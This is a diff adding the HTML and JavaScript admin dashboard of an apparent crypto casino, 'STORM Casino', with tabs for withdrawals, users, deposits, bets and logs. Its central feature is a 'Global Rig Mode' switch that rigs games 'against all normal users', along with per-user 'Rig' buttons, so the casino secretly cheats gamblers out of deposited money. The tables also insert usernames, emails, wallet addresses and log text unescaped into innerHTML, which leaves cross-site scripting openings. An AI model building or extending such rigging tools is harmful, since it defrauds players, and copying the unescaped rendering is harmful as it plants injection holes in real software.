@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard - STORM Casino</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  <style>
+    .rig-toggle { display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-tertiary); border-radius: 8px; margin-bottom: 1.5rem; flex-wrap: wrap; }
+    .toggle-switch { position: relative; width: 60px; height: 30px; background: #333; border-radius: 15px; cursor: pointer; transition: background 0.3s; flex-shrink: 0; }
+    .toggle-switch.active { background: #ef4444; }
+    .toggle-switch::after { content: ''; position: absolute; width: 26px; height: 26px; background: white; border-radius: 50%; top: 2px; left: 2px; transition: transform 0.3s; }
+    .toggle-switch.active::after { transform: translateX(30px); }
+    .owner-badge { background: linear-gradient(135deg, #f59e0b, #d97706); color: white; padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 600; }
+    .admin-badge { background: linear-gradient(135deg, #6366f1, #4f46e5); color: white; padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 600; }
+    .rigged-badge { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 600; }
+    .user-toggle { padding: 0.25rem 0.5rem; font-size: 0.7rem; }
+    .log-entry { padding: 0.75rem; border-bottom: 1px solid var(--border-color); font-size: 0.875rem; }
+    .log-entry:last-child { border-bottom: none; }
+    .log-action { font-weight: 600; color: var(--accent-primary); }
+    .log-time { color: var(--text-muted); font-size: 0.75rem; }
+    @media (max-width: 768px) {
+      .table { display: block; overflow-x: auto; }
+      .admin-grid { grid-template-columns: repeat(2, 1fr); }
+      .rig-toggle { flex-direction: column; align-items: flex-start; }
+      .tabs { flex-wrap: wrap; }
+      .tab { padding: 0.5rem 1rem; font-size: 0.875rem; }
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <a href="/" class="nav-brand">
+      <span class="logo">⚡</span>
+      <span class="brand-name">STORM</span>
+      <span class="owner-badge" id="roleBadge" style="margin-left: 0.5rem; display: none;">OWNER</span>
+    </a>
+    <a href="/" class="btn btn-outline">Back to Site</a>
+  </nav>
+
+  <div class="page-container">
+    <h1 style="margin-bottom: 2rem;">Admin Dashboard</h1>
+
+    <div class="rig-toggle" id="rigToggleContainer" style="display: none;">
+      <div>
+        <div style="font-weight: 600;">Global Rig Mode</div>
+        <div style="font-size: 0.875rem; color: var(--text-muted);">When enabled, games are rigged against all normal users</div>
+      </div>
+      <div class="toggle-switch" id="rigToggle" onclick="toggleRigMode()"></div>
+    </div>
+
+    <div class="admin-grid" id="statsGrid">
+      <div class="admin-stat">
+        <div class="value" id="statUsers">-</div>
+        <div class="label">Total Users</div>
+      </div>
+      <div class="admin-stat">
+        <div class="value" id="statBalance">-</div>
+        <div class="label">Total Balance</div>
+      </div>
+      <div class="admin-stat">
+        <div class="value" id="statWithdrawals">-</div>
+        <div class="label">Pending Withdrawals</div>
+      </div>
+      <div class="admin-stat">
+        <div class="value" id="statDeposits">-</div>
+        <div class="label">Pending Deposits</div>
+      </div>
+    </div>
+
+    <div class="tabs">
+      <button class="tab active" data-tab="withdrawals">Withdrawals</button>
+      <button class="tab" data-tab="users">Users</button>
+      <button class="tab" data-tab="deposits">Deposits</button>
+      <button class="tab" data-tab="bets">Bets</button>
+      <button class="tab" data-tab="transactions">Transactions</button>
+      <button class="tab" data-tab="logs" id="logsTab" style="display: none;">Admin Logs</button>
+    </div>
+
+    <div class="card">
+      <div id="tabContent">Loading...</div>
+    </div>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    let currentTab = 'withdrawals';
+    let isOwner = false;
+    let rigModeEnabled = false;
+
+    async function init() {
+      const res = await fetch('/api/auth/me');
+      if (!res.ok) {
+        window.location.href = '/login.html';
+        return;
+      }
+      const user = await res.json();
+      if (!user.isAdmin && !user.isOwner) {
+        window.location.href = '/';
+        return;
+      }
+
+      isOwner = user.isOwner;
+      
+      if (isOwner) {
+        document.getElementById('roleBadge').style.display = 'inline';
+        document.getElementById('rigToggleContainer').style.display = 'flex';
+        document.getElementById('logsTab').style.display = 'block';
+      }
+
+      loadStats();
+      loadTab('withdrawals');
+    }
+
+    async function loadStats() {
+      try {
+        const res = await fetch('/api/admin/stats');
+        const stats = await res.json();
+        document.getElementById('statUsers').textContent = stats.totalUsers;
+        document.getElementById('statBalance').textContent = '$' + stats.totalBalance.toFixed(2);
+        document.getElementById('statWithdrawals').textContent = stats.pendingWithdrawals;
+        document.getElementById('statDeposits').textContent = stats.pendingDeposits;
+        
+        rigModeEnabled = stats.rigMode;
+        updateRigToggle();
+      } catch (e) {
+        console.error('Failed to load stats', e);
+      }
+    }
+
+    function updateRigToggle() {
+      const toggle = document.getElementById('rigToggle');
+      if (rigModeEnabled) {
+        toggle.classList.add('active');
+      } else {
+        toggle.classList.remove('active');
+      }
+    }
+
+    async function toggleRigMode() {
+      if (!isOwner) return;
+      
+      try {
+        const res = await fetch('/api/admin/rig-mode', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ enabled: !rigModeEnabled })
+        });
+        
+        const data = await res.json();
+        if (res.ok) {
+          rigModeEnabled = data.rigMode;
+          updateRigToggle();
+        }
+      } catch (e) {
+        alert('Failed to toggle rig mode');
+      }
+    }
+
+    async function loadTab(tab) {
+      currentTab = tab;
+      const content = document.getElementById('tabContent');
+      
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelector(`[data-tab="${tab}"]`).classList.add('active');
+
+      if (tab === 'withdrawals') {
+        await loadWithdrawals();
+      } else if (tab === 'users') {
+        await loadUsers();
+      } else if (tab === 'deposits') {
+        await loadDeposits();
+      } else if (tab === 'bets') {
+        await loadBets();
+      } else if (tab === 'transactions') {
+        await loadTransactions();
+      } else if (tab === 'logs') {
+        await loadLogs();
+      }
+    }
+
+    async function loadWithdrawals() {
+      try {
+        const res = await fetch('/api/admin/withdrawals/pending');
+        const withdrawals = await res.json();
+
+        if (withdrawals.length === 0) {
+          document.getElementById('tabContent').innerHTML = '<p style="color: var(--text-muted); text-align: center;">No pending withdrawals</p>';
+          return;
+        }
+
+        document.getElementById('tabContent').innerHTML = `
+          <div style="overflow-x: auto;">
+            <table class="table">
+              <thead>
+                <tr>
+                  <th>User</th>
+                  <th>Amount</th>
+                  <th>Address</th>
+                  <th>Date</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${withdrawals.map(w => `
+                  <tr>
+                    <td>${w.username}</td>
+                    <td>${w.amount}</td>
+                    <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">
+                      <code style="font-size: 0.75rem;">${w.address}</code>
+                      <button class="btn btn-sm btn-outline" onclick="copyText('${w.address}')" style="margin-left: 0.5rem;">Copy</button>
+                    </td>
+                    <td>${new Date(w.requestedAt).toLocaleString()}</td>
+                    <td>
+                      <button class="btn btn-sm btn-success" onclick="approveWithdrawal('${w.id}')">Approve</button>
+                      <button class="btn btn-sm btn-danger" onclick="rejectWithdrawal('${w.id}')">Reject</button>
+                    </td>
+                  </tr>
+                `).join('')}
+              </tbody>
+            </table>
+          </div>
+        `;
+      } catch (e) {
+        document.getElementById('tabContent').innerHTML = '<p style="color: var(--accent-danger);">Failed to load withdrawals</p>';
+      }
+    }
+
+    async function loadUsers() {
+      try {
+        const res = await fetch('/api/admin/users');
+        const users = await res.json();
+
+        document.getElementById('tabContent').innerHTML = `
+          <div style="overflow-x: auto;">
+            <table class="table">
+              <thead>
+                <tr>
+                  <th>Username</th>
+                  <th>Email</th>
+                  <th>Balance</th>
+                  <th>Role</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${users.map(u => `
+                  <tr>
+                    <td>${u.username}</td>
+                    <td>${u.email}</td>
+                    <td>$${u.balance.toFixed(2)}</td>
+                    <td>
+                      ${u.isOwner ? '<span class="owner-badge">OWNER</span>' : 
+                        (u.isAdmin ? '<span class="admin-badge">ADMIN</span>' : 
+                          (u.isRigged ? '<span class="rigged-badge">RIGGED</span>' : 'User'))}
+                    </td>
+                    <td>
+                      <button class="btn btn-sm btn-outline" onclick="adjustBalance('${u.id}', '${u.username}')">Adjust $</button>
+                      ${!u.isOwner && !u.isAdmin ? 
+                        `<button class="btn btn-sm ${u.isRigged ? 'btn-success' : 'btn-danger'} user-toggle" onclick="toggleUserRig('${u.id}', '${u.username}')">${u.isRigged ? 'Unrig' : 'Rig'}</button>` 
+                        : ''}
+                      ${isOwner && !u.isOwner ? (u.isAdmin ? 
+                        `<button class="btn btn-sm btn-danger user-toggle" onclick="removeAdmin('${u.id}', '${u.username}')">-Admin</button>` :
+                        `<button class="btn btn-sm btn-primary user-toggle" onclick="makeAdmin('${u.id}', '${u.username}')">+Admin</button>`
+                      ) : ''}
+                    </td>
+                  </tr>
+                `).join('')}
+              </tbody>
+            </table>
+          </div>
+        `;
+      } catch (e) {
+        document.getElementById('tabContent').innerHTML = '<p style="color: var(--accent-danger);">Failed to load users</p>';
+      }
+    }
+
+    async function loadDeposits() {
+      try {
+        const res = await fetch('/api/admin/deposits');
+        const deposits = await res.json();
+
+        if (deposits.length === 0) {
+          document.getElementById('tabContent').innerHTML = '<p style="color: var(--text-muted); text-align: center;">No deposits</p>';
+          return;
+        }
+
+        document.getElementById('tabContent').innerHTML = `
+          <div style="overflow-x: auto;">
+            <table class="table">
+              <thead>
+                <tr>
+                  <th>User</th>
+                  <th>Currency</th>
+                  <th>TX Hash</th>
+                  <th>Status</th>
+                  <th>Date</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${deposits.map(d => `
+                  <tr>
+                    <td>${d.username || 'N/A'}</td>
+                    <td>${d.currency}</td>
+                    <td style="max-width: 150px; overflow: hidden; text-overflow: ellipsis;"><code style="font-size: 0.75rem;">${d.tx_hash || 'N/A'}</code></td>
+                    <td><span class="status-badge status-${d.status}">${d.status}</span></td>
+                    <td>${new Date(d.detected_at).toLocaleString()}</td>
+                  </tr>
+                `).join('')}
+              </tbody>
+            </table>
+          </div>
+        `;
+      } catch (e) {
+        document.getElementById('tabContent').innerHTML = '<p style="color: var(--accent-danger);">Failed to load deposits</p>';
+      }
+    }
+
+    async function loadBets() {
+      try {
+        const res = await fetch('/api/admin/bets');
+        const bets = await res.json();
+
+        if (bets.length === 0) {
+          document.getElementById('tabContent').innerHTML = '<p style="color: var(--text-muted); text-align: center;">No bets yet</p>';
+          return;
+        }
+
+        document.getElementById('tabContent').innerHTML = `
+          <div style="overflow-x: auto;">
+            <table class="table">
+              <thead>
+                <tr>
+                  <th>User</th>
+                  <th>Game</th>
+                  <th>Bet</th>
+                  <th>Payout</th>
+                  <th>Multi</th>
+                  <th>Result</th>
+                  <th>Date</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${bets.map(b => `
+                  <tr>
+                    <td>${b.username}</td>
+                    <td>${b.gameType}</td>
+                    <td>$${b.bet.toFixed(2)}</td>
+                    <td>$${b.payout.toFixed(2)}</td>
+                    <td>${b.multiplier ? b.multiplier.toFixed(2) + 'x' : '-'}</td>
+                    <td><span class="status-badge ${b.won ? 'status-confirmed' : 'status-rejected'}">${b.won ? 'Win' : 'Loss'}</span></td>
+                    <td>${new Date(b.createdAt).toLocaleString()}</td>
+                  </tr>
+                `).join('')}
+              </tbody>
+            </table>
+          </div>
+        `;
+      } catch (e) {
+        document.getElementById('tabContent').innerHTML = '<p style="color: var(--accent-danger);">Failed to load bets</p>';
+      }
+    }
+
+    async function loadTransactions() {
+      try {
+        const res = await fetch('/api/admin/transactions');
+        const transactions = await res.json();
+
+        if (transactions.length === 0) {
+          document.getElementById('tabContent').innerHTML = '<p style="color: var(--text-muted); text-align: center;">No transactions</p>';
+          return;
+        }
+
+        document.getElementById('tabContent').innerHTML = `
+          <div style="overflow-x: auto;">
+            <table class="table">
+              <thead>
+                <tr>
+                  <th>User</th>
+                  <th>Type</th>
+                  <th>Amount</th>
+                  <th>Reference</th>
+                  <th>Date</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${transactions.map(t => `
+                  <tr>
+                    <td>${t.username}</td>
+                    <td><span class="status-badge ${t.type === 'payout' ? 'status-confirmed' : (t.type === 'bet' ? 'status-rejected' : 'status-pending')}">${t.type}</span></td>
+                    <td style="color: ${t.amount_cents >= 0 ? 'var(--accent-success)' : 'var(--accent-danger)'}">
+                      ${t.amount_cents >= 0 ? '+' : ''}$${(t.amount_cents / 100).toFixed(2)}
+                    </td>
+                    <td>${t.reference_type || '-'} ${t.reference_id || ''}</td>
+                    <td>${new Date(t.created_at).toLocaleString()}</td>
+                  </tr>
+                `).join('')}
+              </tbody>
+            </table>
+          </div>
+        `;
+      } catch (e) {
+        document.getElementById('tabContent').innerHTML = '<p style="color: var(--accent-danger);">Failed to load transactions</p>';
+      }
+    }
+
+    async function loadLogs() {
+      try {
+        const res = await fetch('/api/admin/logs');
+        const logs = await res.json();
+
+        if (logs.length === 0) {
+          document.getElementById('tabContent').innerHTML = '<p style="color: var(--text-muted); text-align: center;">No admin activity logs</p>';
+          return;
+        }
+
+        document.getElementById('tabContent').innerHTML = `
+          <div style="max-height: 500px; overflow-y: auto;">
+            ${logs.map(l => `
+              <div class="log-entry">
+                <div><strong>${l.adminUsername}</strong> <span class="log-action">${l.action}</span> ${l.targetUsername ? `on <strong>${l.targetUsername}</strong>` : ''}</div>
+                ${l.details ? `<div style="color: var(--text-muted); font-size: 0.8rem;">${l.details}</div>` : ''}
+                <div class="log-time">${new Date(l.createdAt).toLocaleString()}</div>
+              </div>
+            `).join('')}
+          </div>
+        `;
+      } catch (e) {
+        document.getElementById('tabContent').innerHTML = '<p style="color: var(--accent-danger);">Failed to load logs</p>';
+      }
+    }
+
+    function copyText(text) {
+      navigator.clipboard.writeText(text);
+      alert('Copied to clipboard!');
+    }
+
+    async function approveWithdrawal(id) {
+      if (!confirm('Are you sure you want to approve this withdrawal? Make sure to send the crypto manually!')) return;
+      
+      try {
+        const res = await fetch(`/api/admin/withdrawals/${id}/approve`, { method: 'POST' });
+        const data = await res.json();
+        
+        if (res.ok) {
+          alert(`Approved! Send ${data.amount} to:\n${data.address}`);
+          loadWithdrawals();
+          loadStats();
+        } else {
+          alert(data.error);
+        }
+      } catch (e) {
+        alert('Failed to approve');
+      }
+    }
+
+    async function rejectWithdrawal(id) {
+      const notes = prompt('Reason for rejection (optional):');
+      
+      try {
+        const res = await fetch(`/api/admin/withdrawals/${id}/reject`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ notes })
+        });
+        
+        if (res.ok) {
+          alert('Withdrawal rejected and balance refunded.');
+          loadWithdrawals();
+          loadStats();
+        }
+      } catch (e) {
+        alert('Failed to reject');
+      }
+    }
+
+    async function adjustBalance(userId, username) {
+      const amount = prompt(`Enter amount to add to ${username}'s balance (use negative for subtraction):`);
+      if (!amount) return;
+
+      try {
+        const res = await fetch(`/api/admin/users/${userId}/balance`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ amount: parseFloat(amount), type: 'add' })
+        });
+        
+        const data = await res.json();
+        if (res.ok) {
+          alert(`New balance: $${data.newBalance.toFixed(2)}`);
+          loadUsers();
+          loadStats();
+        } else {
+          alert(data.error);
+        }
+      } catch (e) {
+        alert('Failed to adjust balance');
+      }
+    }
+
+    async function toggleUserRig(userId, username) {
+      try {
+        const res = await fetch(`/api/admin/users/${userId}/toggle-rig`, { method: 'POST' });
+        const data = await res.json();
+        
+        if (res.ok) {
+          alert(data.message);
+          loadUsers();
+        } else {
+          alert(data.error);
+        }
+      } catch (e) {
+        alert('Failed to toggle rig');
+      }
+    }
+
+    async function makeAdmin(userId, username) {
+      if (!confirm(`Make ${username} an admin?`)) return;
+      
+      try {
+        const res = await fetch(`/api/admin/users/${userId}/make-admin`, { method: 'POST' });
+        const data = await res.json();
+        
+        if (res.ok) {
+          alert(data.message);
+          loadUsers();
+        } else {
+          alert(data.error);
+        }
+      } catch (e) {
+        alert('Failed to make admin');
+      }
+    }
+
+    async function removeAdmin(userId, username) {
+      if (!confirm(`Remove admin privileges from ${username}?`)) return;
+      
+      try {
+        const res = await fetch(`/api/admin/users/${userId}/remove-admin`, { method: 'POST' });
+        const data = await res.json();
+        
+        if (res.ok) {
+          alert(data.message);
+          loadUsers();
+        } else {
+          alert(data.error);
+        }
+      } catch (e) {
+        alert('Failed to remove admin');
+      }
+    }
+
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', () => loadTab(tab.dataset.tab));
+    });
+
+    init();
+  </script>
+</body>
+</html>
